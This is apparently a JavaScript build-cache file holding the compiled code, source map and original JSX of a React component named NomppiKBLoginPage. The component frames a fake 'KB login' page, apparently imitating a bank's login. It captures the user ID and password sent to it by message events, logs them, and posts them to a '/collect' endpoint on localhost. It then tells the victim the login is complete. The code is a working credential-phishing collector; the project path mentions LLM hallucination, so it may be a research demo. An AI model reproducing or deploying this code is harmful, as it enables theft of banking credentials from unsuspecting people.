{"ast":null,"code":"var _jsxFileName = \"C:\\\\Users\\\\user\\\\Desktop\\\\LLM hallucination\\\\nomppi-hundeugi-spa2\\\\src\\\\components\\\\NomppiKBLoginPage.jsx\",\n  _s = $RefreshSig$();\nimport React, { useEffect } from 'react';\nimport { useNavigate } from 'react-router-dom';\nimport { jsxDEV as _jsxDEV } from \"react/jsx-dev-runtime\";\nconst NomppiKBLoginPage = () => {\n  _s();\n  const navigate = useNavigate();\n  useEffect(() => {\n    const handleMessage = event => {\n      var _event$data;\n      if (((_event$data = event.data) === null || _event$data === void 0 ? void 0 : _event$data.type) === 'LOGIN_DATA') {\n        // 중복 실행 방지용 콘솔 로그 추가\n        console.log('[RECEIVED LOGIN_DATA]', event.data);\n        const {\n          userid,\n          password\n        } = event.data;\n        fetch('http://localhost:5000/collect', {\n          method: 'POST',\n          headers: {\n            'Content-Type': 'application/x-www-form-urlencoded'\n          },\n          body: new URLSearchParams({\n            userid,\n            password\n          })\n        }).then(res => {\n          if (!res.ok) throw new Error('서버 응답 오류');\n          return res.text();\n        }).then(() => {\n          alert('로그인 완료!');\n          navigate('/');\n        }).catch(err => {\n          alert('서버 오류: ' + err.message);\n        });\n      }\n    };\n    window.addEventListener('message', handleMessage);\n    return () => window.removeEventListener('message', handleMessage); // ✅ 필수\n  }, [navigate]);\n  return /*#__PURE__*/_jsxDEV(\"iframe\", {\n    src: \"/login.html\",\n    title: \"KB \\uB85C\\uADF8\\uC778\",\n    style: {\n      width: '2000px',\n      height: '900px',\n      border: '1px solid #ccc'\n    }\n  }, void 0, false, {\n    fileName: _jsxFileName,\n    lineNumber: 41,\n    columnNumber: 5\n  }, this);\n};\n_s(NomppiKBLoginPage, \"0pNeyzXk/ByIxyERsdaIrG6js9s=\", false, function () {\n  return [useNavigate];\n});\n_c = NomppiKBLoginPage;\nexport default NomppiKBLoginPage;\nvar _c;\n$RefreshReg$(_c, \"NomppiKBLoginPage\");","map":{"version":3,"names":["React","useEffect","useNavigate","jsxDEV","_jsxDEV","NomppiKBLoginPage","_s","navigate","handleMessage","event","_event$data","data","type","console","log","userid","password","fetch","method","headers","body","URLSearchParams","then","res","ok","Error","text","alert","catch","err","message","window","addEventListener","removeEventListener","src","title","style","width","height","border","fileName","_jsxFileName","lineNumber","columnNumber","_c","$RefreshReg$"],"sources":["C:/Users/user/Desktop/LLM hallucination/nomppi-hundeugi-spa2/src/components/NomppiKBLoginPage.jsx"],"sourcesContent":["import React, { useEffect } from 'react';\r\nimport { useNavigate } from 'react-router-dom';\r\n\r\nconst NomppiKBLoginPage = () => {\r\n  const navigate = useNavigate();\r\n\r\n  useEffect(() => {\r\n  const handleMessage = (event) => {\r\n    if (event.data?.type === 'LOGIN_DATA') {\r\n      // 중복 실행 방지용 콘솔 로그 추가\r\n      console.log('[RECEIVED LOGIN_DATA]', event.data);\r\n\r\n      const { userid, password } = event.data;\r\n\r\n      fetch('http://localhost:5000/collect', {\r\n        method: 'POST',\r\n        headers: {\r\n          'Content-Type': 'application/x-www-form-urlencoded',\r\n        },\r\n        body: new URLSearchParams({ userid, password }),\r\n      })\r\n        .then((res) => {\r\n          if (!res.ok) throw new Error('서버 응답 오류');\r\n          return res.text();\r\n        })\r\n        .then(() => {\r\n          alert('로그인 완료!');\r\n          navigate('/');\r\n        })\r\n        .catch((err) => {\r\n          alert('서버 오류: ' + err.message);\r\n        });\r\n    }\r\n  };\r\n\r\n  window.addEventListener('message', handleMessage);\r\n  return () => window.removeEventListener('message', handleMessage); // ✅ 필수\r\n}, [navigate]);\r\n\r\n  return (\r\n    <iframe\r\n      src=\"/login.html\"\r\n      title=\"KB 로그인\"\r\n      style={{ width: '2000px', height: '900px', border: '1px solid #ccc' }}\r\n    />\r\n  );\r\n};\r\n\r\nexport default NomppiKBLoginPage;"],"mappings":";;AAAA,OAAOA,KAAK,IAAIC,SAAS,QAAQ,OAAO;AACxC,SAASC,WAAW,QAAQ,kBAAkB;AAAC,SAAAC,MAAA,IAAAC,OAAA;AAE/C,MAAMC,iBAAiB,GAAGA,CAAA,KAAM;EAAAC,EAAA;EAC9B,MAAMC,QAAQ,GAAGL,WAAW,CAAC,CAAC;EAE9BD,SAAS,CAAC,MAAM;IAChB,MAAMO,aAAa,GAAIC,KAAK,IAAK;MAAA,IAAAC,WAAA;MAC/B,IAAI,EAAAA,WAAA,GAAAD,KAAK,CAACE,IAAI,cAAAD,WAAA,uBAAVA,WAAA,CAAYE,IAAI,MAAK,YAAY,EAAE;QACrC;QACAC,OAAO,CAACC,GAAG,CAAC,uBAAuB,EAAEL,KAAK,CAACE,IAAI,CAAC;QAEhD,MAAM;UAAEI,MAAM;UAAEC;QAAS,CAAC,GAAGP,KAAK,CAACE,IAAI;QAEvCM,KAAK,CAAC,+BAA+B,EAAE;UACrCC,MAAM,EAAE,MAAM;UACdC,OAAO,EAAE;YACP,cAAc,EAAE;UAClB,CAAC;UACDC,IAAI,EAAE,IAAIC,eAAe,CAAC;YAAEN,MAAM;YAAEC;UAAS,CAAC;QAChD,CAAC,CAAC,CACCM,IAAI,CAAEC,GAAG,IAAK;UACb,IAAI,CAACA,GAAG,CAACC,EAAE,EAAE,MAAM,IAAIC,KAAK,CAAC,UAAU,CAAC;UACxC,OAAOF,GAAG,CAACG,IAAI,CAAC,CAAC;QACnB,CAAC,CAAC,CACDJ,IAAI,CAAC,MAAM;UACVK,KAAK,CAAC,SAAS,CAAC;UAChBpB,QAAQ,CAAC,GAAG,CAAC;QACf,CAAC,CAAC,CACDqB,KAAK,CAAEC,GAAG,IAAK;UACdF,KAAK,CAAC,SAAS,GAAGE,GAAG,CAACC,OAAO,CAAC;QAChC,CAAC,CAAC;MACN;IACF,CAAC;IAEDC,MAAM,CAACC,gBAAgB,CAAC,SAAS,EAAExB,aAAa,CAAC;IACjD,OAAO,MAAMuB,MAAM,CAACE,mBAAmB,CAAC,SAAS,EAAEzB,aAAa,CAAC,CAAC,CAAC;EACrE,CAAC,EAAE,CAACD,QAAQ,CAAC,CAAC;EAEZ,oBACEH,OAAA;IACE8B,GAAG,EAAC,aAAa;IACjBC,KAAK,EAAC,uBAAQ;IACdC,KAAK,EAAE;MAAEC,KAAK,EAAE,QAAQ;MAAEC,MAAM,EAAE,OAAO;MAAEC,MAAM,EAAE;IAAiB;EAAE;IAAAC,QAAA,EAAAC,YAAA;IAAAC,UAAA;IAAAC,YAAA;EAAA,OACvE,CAAC;AAEN,CAAC;AAACrC,EAAA,CA3CID,iBAAiB;EAAA,QACJH,WAAW;AAAA;AAAA0C,EAAA,GADxBvC,iBAAiB;AA6CvB,eAAeA,iBAAiB;AAAC,IAAAuC,EAAA;AAAAC,YAAA,CAAAD,EAAA","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}